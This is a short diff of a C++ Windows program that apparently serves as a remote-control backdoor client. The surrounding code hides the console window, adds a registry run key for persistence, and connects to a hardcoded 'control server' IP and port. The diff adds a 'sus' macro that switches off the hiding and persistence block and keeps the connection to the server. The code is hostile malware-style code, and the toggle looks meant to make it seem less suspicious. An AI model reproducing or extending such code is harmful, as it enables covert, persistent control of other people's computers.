@@ -7,10 +7,13 @@
 #include <string>
 #include <iostream>
 
+#define sus false
+
 #define SERV_PORT 52727 // The port the control server is listening on
 const char szHost[] = "192.168.1.140";
 
 int main(const int argc, const char* argv[]){
+#if sus
     // === Do some typical stuff, hide the console and do some registry editing
     // == Hide the console window
     ShowWindow(GetConsoleWindow(), SW_HIDE);
@@ -38,6 +41,7 @@ int main(const int argc, const char* argv[]){
     );
     // = Close the run key
     RegCloseKey(hKey);
+#endif // sus
     
     // === Connect to the server
     // == Init winsock
